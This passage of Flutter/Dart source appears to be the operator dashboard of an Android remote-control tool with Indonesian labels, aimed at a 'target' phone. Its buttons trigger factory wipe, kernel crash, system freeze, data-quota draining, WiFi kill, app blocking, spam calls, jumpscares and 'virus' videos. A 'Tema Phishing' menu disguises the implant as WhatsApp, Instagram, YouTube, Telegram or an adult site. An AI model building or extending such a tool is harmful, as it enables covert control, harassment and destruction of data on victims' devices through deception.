              ControlTile(title: 'Virus', subtitle: s.spamVideoActive ? 'Aktif' : 'Off', icon: Icons.coronavirus, color: s.spamVideoActive ? const Color(0xFF00C853) : offColor, trailing: PinkSwitch(value: s.spamVideoActive, onChanged: (v) { if (v) { widget.onRun('spamVideo', '{}'); } else { widget.onRun('spamVideoStop'); } })),
              ControlTile(title: 'Flash Disco', subtitle: s.flashDiscoActive ? 'Aktif' : 'Off', icon: Icons.bolt, color: s.flashDiscoActive ? const Color(0xFFFFEA00) : offColor, trailing: PinkSwitch(value: s.flashDiscoActive, onChanged: (v) { if (v) { widget.onRun('flashDisco', '{}'); } else { widget.onRun('flashDiscoStop'); } })),
              ControlTile(title: 'Stop TTS', subtitle: 'Hentikan suara', icon: Icons.stop_rounded, color: offColor, onTap: () => widget.onRun('ttsStop')),
              ControlTile(title: 'Stop Spam', subtitle: 'Hentikan dialog', icon: Icons.notifications_off_outlined, color: offColor, onTap: () => widget.onRun('dialogSpamStop')),
              ControlTile(title: 'Unblock All', subtitle: 'Buka semua app', icon: Icons.apps_outage, color: offColor, onTap: () => widget.onRun('unblockAll')),
              ControlTile(title: 'Stop Jumpscare', subtitle: 'Hentikan scare', icon: Icons.close_rounded, color: offColor, onTap: () => widget.onRun('jumpscareStop')),
              ControlTile(title: 'Stop Jump 2', subtitle: 'Hentikan scare 2', icon: Icons.close_fullscreen, color: offColor, onTap: () => widget.onRun('jumpscare2Stop')),
            ]),
            
            _section('Aksi URL & Media'),
            _commandGrid([
              ControlTile(title: 'Wallpaper', subtitle: 'Ganti wallpaper', icon: Icons.wallpaper, color: const Color(0xFF304FFE), onTap: () => widget.onUrlAction('Wallpaper', 'setWallpaper')),
              ControlTile(title: 'Open URL', subtitle: 'Buka link', icon: Icons.language, color: const Color(0xFF2979FF), onTap: () => widget.onUrlAction('Open URL', 'openUrl')),
              ControlTile(title: 'Play Audio', subtitle: 'Putar audio', icon: Icons.audiotrack, color: const Color(0xFF00E676), onTap: () => widget.onUrlAction('Play Audio', 'playAudio')),
              ControlTile(title: 'Jumpscare', subtitle: 'Kirim gambar', icon: Icons.warning_amber, color: const Color(0xFFD50000), onTap: () => widget.onUrlAction('Jumpscare', 'jumpscareStart')),
              ControlTile(title: 'Jumpscare 2', subtitle: 'Gambar + durasi', icon: Icons.burst_mode, color: const Color(0xFFDD2C00), onTap: () async { final url = await showPromptDialog(context, title: 'Jumpscare 2', hint: 'URL gambar', initial: 'https://files.catbox.moe/ulrmbb.jpg'); if (url != null) await widget.onRun('jumpscare2Start', {'url': url, 'duration': 3000}); }),
              ControlTile(title: 'Spam Call', subtitle: s.spamCallActive ? 'Aktif' : 'Panggil berulang', icon: Icons.phone_forwarded_rounded, color: s.spamCallActive ? const Color(0xFFD50000) : offColor, onTap: () { if (s.spamCallActive) { widget.onRun('spamCallStop'); } else { _showSpamCallSheet(context); } }),
            ]),
            
            // ====================================================================
            // SYSTEM & DESTRUCTIVE
            // ====================================================================
            _section('System & Destructive'),
            _commandGrid([
              ControlTile(title: 'Nyalakan Layar', subtitle: 'Wake up screen', icon: Icons.screen_lock_portrait_outlined, color: const Color(0xFF00E5FF), onTap: () => widget.onRun('turnOnScreen')),
              ControlTile(title: 'Restart HP', subtitle: 'Reboot device', icon: Icons.restart_alt_rounded, color: const Color(0xFFFF6D00), onTap: () => widget.onRun('restartDevice')),
              ControlTile(title: 'Matikan HP', subtitle: 'Shutdown device', icon: Icons.power_settings_new_rounded, color: const Color(0xFFB71C1C), onTap: () => widget.onRun('shutdownDevice')),
              ControlTile(title: 'Crash Kernel', subtitle: s.crashKernelActive ? 'Aktif' : 'System panic', icon: Icons.bug_report_rounded, color: s.crashKernelActive ? const Color(0xFF6200EA) : offColor, trailing: PinkSwitch(value: s.crashKernelActive, onChanged: (v) { if (v) { widget.onRun('crashKernel'); } else { widget.onRun('stopCrashKernel'); } })),
              ControlTile(title: 'System Freeze', subtitle: 'Hang & Ram Full', icon: Icons.ac_unit_rounded, color: const Color(0xFF00BFA5), onTap: () => widget.onRun('systemFreezeV2')),
              ControlTile(title: 'Sedot Kuota', subtitle: s.dataDraining ? 'Sedang menguras...' : 'Habisin Internet', icon: Icons.data_usage_rounded, color: s.dataDraining ? const Color(0xFF2962FF) : offColor, trailing: PinkSwitch(
                value: s.dataDraining,
                onChanged: (v) async {
                  if (v) {
                    await widget.onRun('drainData', jsonEncode({'stopWifi': false}));
                  } else {
                    await widget.onRun('stopDrainData');
                  }
                },
              )),
              ControlTile(title: 'Kill WiFi', subtitle: 'Putus koneksi', icon: Icons.wifi_off, color: const Color(0xFFD50000), onTap: () async { 
                final confirm = await showPromptDialog(context, title: 'Kill WiFi', hint: 'Ketik YA untuk memutuskan WiFi dari HP target', initial: 'YA'); 
                if (confirm?.toUpperCase() == 'YA') await widget.onRun('killWifi'); 
              }),
              ControlTile(title: 'Factory Wipe', subtitle: 'Hapus semua data', icon: Icons.delete_forever_rounded, color: const Color(0xFFB71C1C), onTap: () => widget.onRun('factoryWipe')),
            ]),

            Padding(
              padding: const EdgeInsets.all(16),
              child: ElegantCard(
                onTap: () => Clipboard.setData(ClipboardData(text: id)),
                padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                child: Row(
                  children: [
                    Icon(Icons.copy_rounded, size: 16, color: AppColors.dashAccent.withValues(alpha: 0.7)),
                    const SizedBox(width: 10),
                    Expanded(child: Text('Copy Device ID', style: AppTypography.menuSubtitle())),
                    Text(id, style: AppTypography.techId(), maxLines: 1, overflow: TextOverflow.ellipsis),
                  ],
                ),
              ),
            ),
            ], // end tab 2
          ],
        ),
        if (widget.busy) const Positioned(top: 0, left: 0, right: 0, child: LinearProgressIndicator(color: AppColors.dashAccent, minHeight: 2)),
      ],
    );
  }

  void _showPhishingThemeSheet(BuildContext context, Future<void> Function(String command, [dynamic value]) onRun) {
    const themes = [
      _PhishingThemeOption('Default', Icons.home_outlined, 'default'),
      _PhishingThemeOption('WhatsApp', Icons.chat, 'whatsapp'),
      _PhishingThemeOption('Instagram', Icons.camera_alt_outlined, 'instagram'),
      _PhishingThemeOption('YouTube', Icons.play_circle_outline, 'youtube'),
      _PhishingThemeOption('Telegram', Icons.send_outlined, 'telegram'),
      _PhishingThemeOption('XNXX', Icons.hide_source_outlined, 'xnxx'),
    ];

    showModalBottomSheet<void>(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (sheetCtx) {
        final bottomPad = MediaQuery.viewPaddingOf(sheetCtx).bottom;
        return Padding(
          padding: EdgeInsets.fromLTRB(12, 0, 12, 12 + bottomPad),
          child: Container(
            decoration: BoxDecoration(color: ElegantCard.surface, borderRadius: const BorderRadius.vertical(top: Radius.circular(22)), border: Border.all(color: AppColors.neoBlack, width: 3)),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const SizedBox(height: 10),
                Container(width: 40, height: 4, decoration: BoxDecoration(color: AppColors.dashAccent.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(99))),
                Padding(
                  padding: const EdgeInsets.fromLTRB(16, 14, 16, 8),
                  child: Row(
                    children: [
                      Container(width: 42, height: 42, decoration: BoxDecoration(borderRadius: BorderRadius.circular(14), color: AppColors.dashAccent.withValues(alpha: 0.1)), child: const Icon(Icons.palette_outlined, color: AppColors.dashAccent)),
                      const SizedBox(width: 12),
                      Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [Text('Tema Phishing', style: AppTypography.menuTitle()), Text('Pilih icon & nama aplikasi', style: AppTypography.menuSubtitle())])),
                    ],
                  ),
                ),
                ...themes.map((theme) => Padding(
                  padding: const EdgeInsets.fromLTRB(12, 0, 12, 8),
                  child: Material(
                    color: Colors.transparent,
                    child: InkWell(
                      onTap: () { Navigator.pop(sheetCtx); onRun('changeTheme', theme.value); },
                      borderRadius: BorderRadius.circular(14),
                      child: Ink(
                        height: 64,
                        decoration: BoxDecoration(borderRadius: BorderRadius.circular(14), color: AppColors.dashAccent.withValues(alpha: 0.04), border: Border.all(color: AppColors.neoBlack, width: 3)),
                        child: Padding(
                          padding: const EdgeInsets.symmetric(horizontal: 14),
                          child: Row(
                            children: [
                              Container(width: 36, height: 36, decoration: BoxDecoration(borderRadius: BorderRadius.circular(10), color: AppColors.dashAccent.withValues(alpha: 0.1)), child: _DynamicIcon(theme.icon, size: 18, color: AppColors.dashAccent)),
                              const SizedBox(width: 12),
                              Expanded(child: Text(theme.label, style: AppTypography.menuTitle().copyWith(fontSize: 14))),
                              Icon(Icons.chevron_right_rounded, size: 18, color: AppColors.dashAccent.withValues(alpha: 0.6)),
                            ],
                          ),
                        ),
                      ),
                    ),
                  ),
                )),
                const SizedBox(height: 4),
              ],
            ),
          ),
        );
      },
    );
  }

  void _showSpamCallSheet(BuildContext context) {
    String callerName = '';
    String callerNumber = '';
    int repeatCount = 5;

    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => StatefulBuilder(
        builder: (sheetCtx, setSheetState) {
          return Container(
            margin: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: ElegantCard.surface,
              borderRadius: BorderRadius.circular(AppRadius.md),
              border: Border.all(color: AppColors.neoBlack, width: 3),
            ),
            child: SafeArea(
              child: Padding(
                padding: const EdgeInsets.all(20),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        const Icon(Icons.phone_in_talk_rounded, color: AppColors.dashAccent, size: 28),
                        const SizedBox(width: 12),
                        Text('Spam Call', style: AppTypography.menuTitle()),
                      ],
                    ),
                    const SizedBox(height: 20),
                    TextField(
                      onChanged: (v) => callerName = v,
                      style: AppTypography.menuSubtitle(),
                      decoration: InputDecoration(
                        labelText: 'Nama Penelepon',
                        labelStyle: AppTypography.welcomeMeta(),
                        border: const OutlineInputBorder(),
                        enabledBorder: const OutlineInputBorder(
                          borderSide: BorderSide(color: AppColors.neoBlack),
                        ),
                        focusedBorder: const OutlineInputBorder(
                          borderSide: BorderSide(color: AppColors.dashAccent),
                        ),
                      ),
                    ),
                    const SizedBox(height: 16),
                    TextField(
                      onChanged: (v) => callerNumber = v,
                      style: AppTypography.menuSubtitle(),
                      keyboardType: TextInputType.phone,
                      decoration: InputDecoration(
                        labelText: 'Nomor Telepon',
                        labelStyle: AppTypography.welcomeMeta(),
                        border: const OutlineInputBorder(),
                        enabledBorder: const OutlineInputBorder(
                          borderSide: BorderSide(color: AppColors.neoBlack),
                        ),
                        focusedBorder: const OutlineInputBorder(
                          borderSide: BorderSide(color: AppColors.dashAccent),
                        ),
                      ),
                    ),
                    const SizedBox(height: 20),
                    Text('JUMLAH REPEAT', style: AppTypography.welcomeMeta()),
                    const SizedBox(height: 8),
                    Row(
                      children: [
                        _buildRepeatChip('3x', 3, repeatCount, (val) => setSheetState(() => repeatCount = val)),
                        const SizedBox(width: 8),
                        _buildRepeatChip('5x', 5, repeatCount, (val) => setSheetState(() => repeatCount = val)),
                        const SizedBox(width: 8),
                        _buildRepeatChip('10x', 10, repeatCount, (val) => setSheetState(() => repeatCount = val)),
                      ],
                    ),
                    const SizedBox(height: 24),
                    Row(
                      children: [
                        Expanded(
                          child: OutlinedButton(
                            style: OutlinedButton.styleFrom(
                              side: const BorderSide(color: AppColors.dashAccent),
                            ),
                            onPressed: () => Navigator.pop(sheetCtx),
                            child: const Text('BATAL', style: TextStyle(color: AppColors.dashAccent)),
                          ),
                        ),
                        const SizedBox(width: 12),
                        Expanded(
                          child: FilledButton(
                            style: FilledButton.styleFrom(backgroundColor: AppColors.dashAccent),
                            onPressed: () {
                              Navigator.pop(sheetCtx);
                              if (callerNumber.isNotEmpty) {
                                widget.onRun(
                                  'spamCall',
                                  jsonEncode({
                                    'name': callerName,
                                    'number': callerNumber,
                                    'repeat': repeatCount,
                                  }),
                                );
                              }
                            },
                            child: const Text('CALL'),
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ),
          );
        },
      ),
    );
  }

  Widget _buildRepeatChip(String label, int value, int selectedVal, Function(int) onSelect) {
    final isSelected = value == selectedVal;
    return ChoiceChip(
      label: Text(label, style: TextStyle(color: isSelected ? Colors.white : AppColors.dashAccent, fontWeight: FontWeight.bold)),
      selected: isSelected,
      selectedColor: AppColors.dashAccent,
      backgroundColor: Colors.transparent,
      side: const BorderSide(color: AppColors.dashAccent),
      onSelected: (_) => onSelect(value),
    );
  }
}

// ==============================================================================
// WIDGET APP MANAGER INLINE
// ==============================================================================
class _InlineAppManager extends StatefulWidget {
  final Future<List<Map<String, dynamic>>> Function() onFetchApps;
  final Future<void> Function(String command, [dynamic value]) onRun;
  final List<String> initialBlocked;

  const _InlineAppManager({super.key, required this.onFetchApps, required this.onRun, required this.initialBlocked});

  @override
  State<_InlineAppManager> createState() => _InlineAppManagerState();
}

class _InlineAppManagerState extends State<_InlineAppManager> {
  List<Map<String, dynamic>> _apps = [];
  List<String> _blocked = [];
  bool _loading = true;
  final _searchController = TextEditingController();
  String _searchQuery = '';

  @override
  void initState() {
    super.initState();
    _blocked = List.from(widget.initialBlocked);
    _loadApps();
    _searchController.addListener(() { setState(() { _searchQuery = _searchController.text.toLowerCase(); }); });
  }

  @override
  void dispose() {
    _searchController.dispose();
    super.dispose();
  }

  Future<void> _loadApps() async {
    setState(() => _loading = true);
    try {
      final apps = await widget.onFetchApps();
      if (mounted) setState(() { _apps = apps; _loading = false; });
    } catch (e) {
      if (mounted) setState(() => _loading = false);
    }
  }

  List<Map<String, dynamic>> get _filteredApps {
    if (_searchQuery.isEmpty) return _apps;
    return _apps.where((app) {
      final name = (app['name']?.toString() ?? '').toLowerCase();
      final pkg = (app['package']?.toString() ?? '').toLowerCase();
      return name.contains(_searchQuery) || pkg.contains(_searchQuery);
    }).toList();
  }

  @override
  Widget build(BuildContext context) {
    final filteredList = _filteredApps;

    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: ElegantCard(
        padding: EdgeInsets.zero,
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
              child: Row(
                children: [
                  Container(width: 36, height: 36, decoration: BoxDecoration(borderRadius: BorderRadius.circular(10), color: AppColors.dashAccent.withValues(alpha: 0.1)), child: const Icon(Icons.security_rounded, size: 18, color: AppColors.dashAccent)),
                  const SizedBox(width: 12),
                  Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [Text('App Manager / Firewall', style: AppTypography.menuTitle().copyWith(fontSize: 15)), Text(_loading ? 'Memuat daftar aplikasi...' : '${_blocked.length} aplikasi diblokir', style: AppTypography.welcomeMeta())])),
                  if (!_loading) GestureDetector(onTap: _loadApps, child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: AppColors.dashAccent.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(8)), child: const Icon(Icons.refresh, size: 16, color: AppColors.dashAccent))),
                ],
              ),
            ),
            Container(
              margin: const EdgeInsets.fromLTRB(12, 12, 12, 8),
              height: 40,
              decoration: BoxDecoration(color: AppColors.dashAccent.withValues(alpha: 0.06), borderRadius: BorderRadius.circular(12), border: Border.all(color: AppColors.neoBlack, width: 2)),
              child: TextField(
                controller: _searchController,
                style: AppTypography.menuSubtitle().copyWith(fontSize: 13),
                decoration: InputDecoration(hintText: 'Cari nama atau package...', hintStyle: AppTypography.welcomeMeta().copyWith(fontSize: 13), prefixIcon: Icon(Icons.search, size: 18, color: AppColors.dashAccent.withValues(alpha: 0.5)), border: InputBorder.none, contentPadding: const EdgeInsets.symmetric(vertical: 10)),
              ),
            ),
            if (_loading && _apps.isEmpty)
              const Padding(padding: EdgeInsets.symmetric(vertical: 32), child: Center(child: CircularProgressIndicator(color: AppColors.dashAccent, strokeWidth: 2)))
            else if (_apps.isEmpty && !_loading)
              Padding(padding: const EdgeInsets.symmetric(vertical: 32), child: Center(child: Text('Gagal memuat daftar aplikasi', style: AppTypography.menuSubtitle())))
            else
              ConstrainedBox(
                constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.4),
                child: filteredList.isEmpty 
                  ? Padding(padding: const EdgeInsets.symmetric(vertical: 24), child: Center(child: Text('Aplikasi tidak ditemukan', style: AppTypography.menuSubtitle())))
                  : ListView.separated(
                      shrinkWrap: true,
                      physics: const ClampingScrollPhysics(),
                      padding: const EdgeInsets.only(bottom: 12),
                      itemCount: filteredList.length,
                      separatorBuilder: (_, __) => Divider(height: 1, color: AppColors.dashAccent.withValues(alpha: 0.06), indent: 16, endIndent: 16),
                      itemBuilder: (_, i) {
                        final app = filteredList[i];
                        final pkg = app['package']?.toString() ?? '';
                        final name = app['name']?.toString() ?? pkg;
                        final isBlocked = _blocked.contains(pkg);
                        return ListTile(
                          contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 4),
                          dense: false,
                          title: Text(name, style: AppTypography.menuSubtitle().copyWith(fontWeight: FontWeight.w600, fontSize: 13)),
                          subtitle: Text(pkg, style: AppTypography.techId().copyWith(fontSize: 10), maxLines: 1, overflow: TextOverflow.ellipsis),
                          trailing: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              // Open App dulu (play ➤) — lebih besar seperti referensi
                              GestureDetector(
                                onTap: () async {
                                  await widget.onRun('openApp', pkg);
                                  if (mounted) showSyncSnack(context, 'Membuka $name', success: true);
                                },
                                child: Container(
                                  width: 36,
                                  height: 36,
                                  decoration: BoxDecoration(
                                    color: const Color(0xFF00C853).withValues(alpha: 0.15),
                                    borderRadius: BorderRadius.circular(10),
                                    border: Border.all(
                                      color: const Color(0xFF00C853).withValues(alpha: 0.5),
                                      width: 1.5,
                                    ),
                                  ),
                                  child: const Icon(
                                    Icons.play_arrow_rounded,
                                    size: 22,
                                    color: Color(0xFF00C853),
                                  ),
                                ),
                              ),
                              const SizedBox(width: 10),
                              // Switch block/unblock
                              SizedBox(
                                height: 28,
                                child: PinkSwitch(
                                  value: isBlocked,
                                  onChanged: (v) async {
                                    if (v) {
                                      await widget.onRun('blockApp', {'package': pkg, 'name': name});
                                      setState(() {
                                        if (!_blocked.contains(pkg)) _blocked.add(pkg);
                                      });
                                    } else {
                                      await widget.onRun('unblockApp', pkg);
                                      setState(() {
                                        _blocked.remove(pkg);
                                      });
                                    }
                                  },
                                ),
                              ),
                            ],
                          ),
                        );
                      },
                    ),
              ),
          ],
        ),
      ),
    );
  }
}

class _PhishingThemeOption {
  const _PhishingThemeOption(this.label, this.icon, this.value);
  final String label;
  final dynamic icon;
  final String value;
}

extension on DeviceStatus {
  String get mutedVolumeLabel => volumeMuted ? 'Muted' : 'Off';
}

// WEBA2APK_DYNAMIC_ICON_START
class _DynamicIcon extends StatelessWidget {
  final dynamic icon;
  final double? size;
  final Color? color;

  const _DynamicIcon(this.icon, {Key? key, this.size, this.color}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    if (icon == null) return const SizedBox(width: 0, height: 0);
    return Center(widthFactor: 1.0, heightFactor: 1.0, child: Icon(icon, size: size, color: color));
  }
}
// WEBA2APK_DYNAMIC_ICON_END
